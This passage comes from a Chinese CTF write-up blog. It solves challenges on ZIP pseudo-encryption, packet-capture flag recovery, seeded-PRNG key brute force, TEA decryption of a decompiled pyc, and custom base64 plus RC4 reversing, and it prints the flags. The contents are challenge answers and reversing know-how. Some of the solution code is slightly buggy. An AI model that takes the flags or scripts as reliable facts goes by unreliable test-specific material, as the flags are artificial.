文件注释长度                    2 bytes　　磁盘开始号                      2 bytes　　内部文件属性                    2 bytes　　外部文件属性                    4 bytes        局部头部偏移量                  4 bytes　　文件名                       （不定长度）　　扩展字段                     （不定长度）        文件注释                     （不定长度）</code></pre><p>–&gt;这里是有判断是否存在加密情况的判断点</p><h3 id="识别真假加密"><a href="#识别真假加密" class="headerlink" title="识别真假加密"></a>识别真假加密</h3><h4 id="无加密"><a href="#无加密" class="headerlink" title="无加密"></a>无加密</h4><p>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为00 00</p><h4 id="假加密"><a href="#假加密" class="headerlink" title="假加密"></a>假加密</h4><p>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p><h4 id="真加密"><a href="#真加密" class="headerlink" title="真加密"></a>真加密</h4><p>压缩源文件数据区的全局加密应当为09 00<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660556886626-135a484c-b34a-4d01-aa9b-d470b5655e76.png"                      alt="image.png"                >3、压缩源文件目录结束标志<br>    　　　组成               　          长度</p><hr><pre><code>    目录结束标记                    4 bytes  (0x02014b50)</code></pre><p>当前磁盘编号                    2 bytes<br>        目录区开始磁盘编号              2 bytes<br>    　本磁盘上纪录总数                 2 bytes<br>    　目录区中纪录总数                 2 bytes<br>    　目录区尺寸大小                   4 bytes<br>    　目录区对第一张磁盘的偏移量    4 bytes<br>    　ZIP 文件注释长度                 2 bytes<br>根据题目说是伪加密<br>直接将上面提及的09 00 改为00 00改好后保存，这时压缩包就可以打开了，得到flag文件<img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660557132199-c2f02aed-2fac-4abe-90d7-280fda222983.png"                      alt="图片.png"                ><br>###flag{Adm1N-B2G-kU-SZIP}</p><h2 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660557611328-2be8b50d-6c6b-48e1-86f5-7398bea14fa3.png"                      alt="图片.png"                ><br>抓取的文件传输的数据，直接寻找POST包<br><code>http.request.method==POST  </code><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660557675740-bce894b4-bd76-41b0-8aa1-359b407f1ae1.png"                      alt="图片.png"                >跟踪TCP流找到flag<br>###flag{da73d88936010da1eeeb36e945ec4b97}</p><h1 id="安全测试员职业技能赛"><a href="#安全测试员职业技能赛" class="headerlink" title="安全测试员职业技能赛"></a>安全测试员职业技能赛</h1><h2 id="01hidden-key"><a href="#01hidden-key" class="headerlink" title="01hidden key"></a>01hidden key</h2><p>赛题：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span>  random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">key=os.urandom(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand</span>(<span class="params">rng</span>):</span><br><span class="line">    <span class="keyword">return</span> rng - random.randrange(rng)</span><br><span class="line">m=[]</span><br><span class="line">random.seed(<span class="built_in">int</span>(hashlib.md5(key).hexdigest(), <span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    rand(<span class="number">256</span>)</span><br><span class="line">    xor=flag[i]^rand(<span class="number">256</span>)</span><br><span class="line">    m.append(xor)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(key)&gt;&gt;<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [140, 96, 112, 178, 38, 180, 158, 240, 179, 202, 251, 138, 188, 185, 23, 67, 163, 22, 150, 18, 143, 212, 93, 87, 209, 139, 92, 252, 55, 137, 6, 231, 105, 12, 65, 59, 223, 25, 179, 101, 19, 215]</span></span><br><span class="line"><span class="comment"># 2669175714787937</span></span><br></pre></td></tr></table></figure></div><p>由题目可知，key左移12位，因此在2669175714787937右移12位后减去4096到加上4096长度的区间内进行爆破，解题脚本：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand</span>(<span class="params">rng</span>):</span><br><span class="line">    <span class="keyword">return</span> rng - random.randrange(rng)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10932943727771385856</span>,<span class="number">10932943727771394048</span>):</span><br><span class="line">    key1=long_to_bytes(i)</span><br><span class="line">    random.seed(<span class="built_in">int</span>(hashlib.md5(key1).hexdigest(), <span class="number">16</span>))</span><br><span class="line">    m = <span class="string">&quot;&quot;</span></span><br><span class="line">    flag = [<span class="number">140</span>, <span class="number">96</span>, <span class="number">112</span>, <span class="number">178</span>, <span class="number">38</span>, <span class="number">180</span>, <span class="number">158</span>, <span class="number">240</span>, <span class="number">179</span>, <span class="number">202</span>, <span class="number">251</span>, <span class="number">138</span>, <span class="number">188</span>, <span class="number">185</span>, <span class="number">23</span>, <span class="number">67</span>, <span class="number">163</span>, <span class="number">22</span>, <span class="number">150</span>, <span class="number">18</span>, <span class="number">143</span>, <span class="number">212</span>, <span class="number">93</span>,</span><br><span class="line">            <span class="number">87</span>, <span class="number">209</span>, <span class="number">139</span>, <span class="number">92</span>, <span class="number">252</span>, <span class="number">55</span>, <span class="number">137</span>, <span class="number">6</span>, <span class="number">231</span>, <span class="number">105</span>, <span class="number">12</span>, <span class="number">65</span>, <span class="number">59</span>, <span class="number">223</span>, <span class="number">25</span>, <span class="number">179</span>, <span class="number">101</span>, <span class="number">19</span>, <span class="number">215</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        rand(<span class="number">256</span>)</span><br><span class="line">        xor = flag[i] ^ rand(<span class="number">256</span>)</span><br><span class="line">        m += <span class="built_in">chr</span>(xor)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">#flag&#123;e319a58c-4dd6-4e6a-a3fb-f4b0d339faba&#125;</span></span><br></pre></td></tr></table></figure></div><h4 id="other-method"><a href="#other-method" class="headerlink" title="other method"></a>other method</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(bytes_to_long(key)&gt;&gt;12)</span><br></pre></td></tr></table></figure></div><p>脚本</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand</span>(<span class="params">rng</span>):</span><br><span class="line"><span class="keyword">return</span> rng - random.randrange(rng)</span><br><span class="line">key_int = (<span class="number">2669175714787937</span>) &lt;&lt; <span class="number">12</span></span><br><span class="line"><span class="keyword">for</span> key_ad <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">12</span>)):</span><br><span class="line">key = long_to_bytes(key_int + key_ad)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">random.seed(<span class="built_in">int</span>(hashlib.md5(key).hexdigest(), <span class="number">16</span>))</span><br><span class="line">m = [<span class="number">140</span>, <span class="number">96</span>, <span class="number">112</span>, <span class="number">178</span>, <span class="number">38</span>, <span class="number">180</span>, <span class="number">158</span>, <span class="number">240</span>, <span class="number">179</span>, <span class="number">202</span>, <span class="number">251</span>, <span class="number">138</span>, <span class="number">188</span>, <span class="number">185</span>, <span class="number">23</span>,</span><br><span class="line"><span class="number">67</span>, <span class="number">163</span>, <span class="number">22</span>, <span class="number">150</span>, <span class="number">18</span>, <span class="number">143</span>, <span class="number">212</span>, <span class="number">93</span>, <span class="number">87</span>, <span class="number">209</span>, <span class="number">139</span>, <span class="number">92</span>, <span class="number">252</span>, <span class="number">55</span>, <span class="number">137</span>, <span class="number">6</span>, <span class="number">231</span>, <span class="number">105</span>,</span><br><span class="line"><span class="number">12</span>, <span class="number">65</span>, <span class="number">59</span>, <span class="number">223</span>, <span class="number">25</span>, <span class="number">179</span>, <span class="number">101</span>, <span class="number">19</span>, <span class="number">215</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">a = rand(<span class="number">256</span>)</span><br><span class="line">b = rand(<span class="number">256</span>)</span><br><span class="line">xor=m[i]^b</span><br><span class="line">flag += <span class="built_in">chr</span>(xor)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="built_in">print</span>(key_ad)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div><h3 id="02bad-python"><a href="#02bad-python" class="headerlink" title="02bad python"></a>02bad python</h3><p>010打开附件，发现缺少pyc文件头，由附件名可知，缺少的是python3.6版本的pyc文件头，于是补全，然后得到在线反编译代码：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = c_uint32(v[<span class="number">0</span>])</span><br><span class="line">    v1 = c_uint32(v[<span class="number">1</span>])</span><br><span class="line">    sum1 = c_uint32(<span class="number">0</span>)</span><br><span class="line">    delta = <span class="number">195935983</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v0.value += (v1.value &lt;&lt; <span class="number">4</span> ^ v1.value &gt;&gt; <span class="number">7</span>) + v1.value ^ sum1.value + k[sum1.value &amp; <span class="number">3</span>]</span><br><span class="line">        sum1.value += delta</span><br><span class="line">        v1.value += (v0.value &lt;&lt; <span class="number">4</span> ^ v0.value &gt;&gt; <span class="number">7</span>) + v0.value ^ sum1.value + k[sum1.value &gt;&gt; <span class="number">9</span> &amp; <span class="number">3</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (v0.value, v1.value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    flag = <span class="built_in">input</span>(<span class="string">&#x27;please input your flag:&#x27;</span>)</span><br><span class="line">    k = [</span><br><span class="line">        <span class="number">255</span>,</span><br><span class="line">        <span class="number">187</span>,</span><br><span class="line">        <span class="number">51</span>,</span><br><span class="line">        <span class="number">68</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(flag) != <span class="number">32</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;wrong!&#x27;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    a = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>, <span class="number">8</span>):</span><br><span class="line">        v1 = bytes_to_long(<span class="built_in">bytes</span>(flag[i:i + <span class="number">4</span>], <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        v2 = bytes_to_long(<span class="built_in">bytes</span>(flag[i + <span class="number">4</span>:i + <span class="number">8</span>], <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        a += encrypt([</span><br><span class="line">            v1,</span><br><span class="line">            v2], k)</span><br><span class="line">    </span><br><span class="line">    enc = [</span><br><span class="line">        <span class="number">0xEEC7D402L</span>,</span><br><span class="line">        <span class="number">0x99E9363FL</span>,</span><br><span class="line">        <span class="number">0x853BDE61L</span>,</span><br><span class="line">        <span class="number">558171287</span>,</span><br><span class="line">        <span class="number">0x908F94B0L</span>,</span><br><span class="line">        <span class="number">1715140098</span>,</span><br><span class="line">        <span class="number">986348143</span>,</span><br><span class="line">        <span class="number">1948615354</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> enc[i] != a[i]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;wrong!&#x27;</span>)</span><br><span class="line">            exit(-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;flag is flag&#123;%s&#125;&#x27;</span> % flag)</span><br></pre></td></tr></table></figure></div><p>可知是tea加密，写出解密脚本：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;  </span><br><span class="line">  <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>];</span><br><span class="line">  <span class="type">uint32_t</span> v1 = v[<span class="number">1</span>];</span><br><span class="line">  <span class="type">uint32_t</span> sum1 = <span class="number">6269951456</span>;</span><br><span class="line">  <span class="type">uint32_t</span> delta= <span class="number">195935983</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">  v1 -= (v0 &lt;&lt; <span class="number">4</span> ^ v0 &gt;&gt; <span class="number">7</span>) + v0 ^ sum1 + k[sum1 &gt;&gt; <span class="number">9</span> &amp; <span class="number">3</span>];</span><br><span class="line">    sum1 -= delta;</span><br><span class="line">    v0 -= (v1 &lt;&lt; <span class="number">4</span> ^ v1 &gt;&gt; <span class="number">7</span>) + v1 ^ sum1 + k[sum1 &amp; <span class="number">3</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = v0;</span><br><span class="line">  v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">uint32_t</span> k[<span class="number">4</span>] = &#123;<span class="number">255</span>, <span class="number">187</span>,<span class="number">51</span>,<span class="number">68</span>&#125;;</span><br><span class="line">   <span class="type">uint32_t</span> v[<span class="number">8</span>] = &#123;<span class="number">0xEEC7D402</span>,<span class="number">0x99E9363F</span>,<span class="number">0x853BDE61</span>,<span class="number">558171287</span>,<span class="number">0x908F94B0</span>,<span class="number">1715140098</span>,<span class="number">986348143</span>,<span class="number">1948615354</span>&#125;;</span><br><span class="line">   <span class="type">uint32_t</span> v1[<span class="number">2</span>];</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">8</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">     v1[<span class="number">0</span>]=v[i];</span><br><span class="line">     v1[<span class="number">1</span>]=v[i+<span class="number">1</span>];</span><br><span class="line">     decrypt(v,k);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Decrypted data is : %x %x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">   &#125;</span><br><span class="line">      </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//Decrypted data is : 54683173 5f31735f</span></span><br><span class="line"><span class="comment">//Decrypted data is : f3d3464e 6074057d</span></span><br><span class="line"><span class="comment">//Decrypted data is : a2d58ef0 1ffccc21</span></span><br><span class="line"><span class="comment">//Decrypted data is : b43e3807 9041e478</span></span><br><span class="line"><span class="comment">//Decrypted data is : ae371ecd 38e014ed</span></span><br><span class="line"><span class="number">0xAB</span>,<span class="number">0x28</span>,<span class="number">0x52</span>,<span class="number">0x47</span>,<span class="number">0xF6</span>,<span class="number">0xA7</span>,<span class="number">0xAC</span>,<span class="number">0xA3</span>,<span class="number">0x20</span>,<span class="number">0x6F</span>,<span class="number">0xA3</span>,<span class="number">0x66</span>,<span class="number">0x0B</span>,<span class="number">0x49</span>,<span class="number">0xF8</span>,<span class="number">0x09</span>,<span class="number">0x79</span>,<span class="number">0x40</span>,<span class="number">0x54</span>,<span class="number">0x12</span>,<span class="number">0x16</span>,<span class="number">0xED</span>,<span class="number">0xB3</span>,<span class="number">0x58</span>,<span class="number">0xF3</span>,<span class="number">0x63</span>,<span class="number">0x9E</span>,<span class="number">0x99</span>,<span class="number">0x20</span>,<span class="number">0x4D</span>,<span class="number">0x7C</span>,<span class="number">0xEE</span></span><br></pre></td></tr></table></figure></div><p>然后转成byte类型组合在一起可得Th1s_1s_A_Easy_Pyth0n__R3veRse_0</p><p>flag{Th1s_1s_A_Easy_Pyth0n__R3veRse_0}</p><h3 id="03ereeee"><a href="#03ereeee" class="headerlink" title="03ereeee"></a>03ereeee</h3><p>下载附件，打开ida分析可知是rce加密和base64换表加密</p><p>解题脚本：换表base64:</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">str1 = <span class="string">&quot;ScDZC1cNDZaxnh/2eW1UdqaCiJ0ijRIExlvVEgP43rpxoxbYePBhpwHDPJ==&quot;</span></span><br><span class="line">string1 = <span class="string">&quot;ZYXWVUTSRQPONMLKJIHGFEDCBAabcdefghijklmnopqrstuvwxyz/+9876543210&quot;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br><span class="line"><span class="comment">#\x1d\xc5\x80_\xe7\x0cX\x06\xb1\x9e\x1d=x?\x85v\xa6\x97\x89\x0f\xe2\x8c\x84U\xc6[\xc4V\x02\xbb\xf2\xbaq\xa3\x16\xc1x\xa6!\xa7\x04\x96)</span></span><br></pre></td></tr></table></figure></div><p>rc4解密：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RC4解密主函数调用成功&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = rc4_excrypt(message, s_box)</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原来的 s 盒：%s&quot;</span> % s_box)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;混乱后的 s 盒：%s&quot;</span>% s_box)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;调用解密程序成功。&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    plain = base64.b64decode(plain.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    plain = <span class="built_in">bytes</span>.decode(plain)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;res用于解密字符串，解密后是：%res&quot;</span> %res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的字符串是：%s&quot;</span> %cipher)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的输出(没经过任何编码):&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line">a=[] <span class="comment">#cipher</span></span><br><span class="line">key=<span class="string">&quot;flag&#123;123321321123badbeef012&#125;&quot;</span></span><br><span class="line">s=<span class="string">&quot;\x1d\xc5\x80_\xe7\x0cX\x06\xb1\x9e\x1d=x?\x85v\xa6\x97\x89\x0f\xe2\x8c\x84U\xc6[\xc4V\x02\xbb\xf2\xbaq\xa3\x16\xc1x\xa6!\xa7\x04\x96)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    s+=<span class="built_in">chr</span>(i)</span><br><span class="line">s=<span class="built_in">str</span>(base64.b64encode(s.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">rc4_main(key, s)</span><br></pre></td></tr></table></figure></div><p>得flag{RC_f0ur_And_Base_s1xty_f0ur_Encrypt_!}</p><p>将flag{}包裹的字符串md5后再用flag{}包裹得flag{7d3357ea9ae1a4b2746147bc053c190d}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="ctf_Replay" scheme="https://juana-2u.github.io/tags/ctf-Replay/"/>
    
  </entry>
  
  <entry>
    <title>moeCTF20221114</title>
    <link href="https://juana-2u.github.io/2023/09/11/moeCTF20221114/"/>
    <id>https://juana-2u.github.io/2023/09/11/moeCTF20221114/</id>
    <published>2023-09-11T07:08:10.000Z</published>
    <updated>2023-10-13T13:35:09.345Z</updated>
    
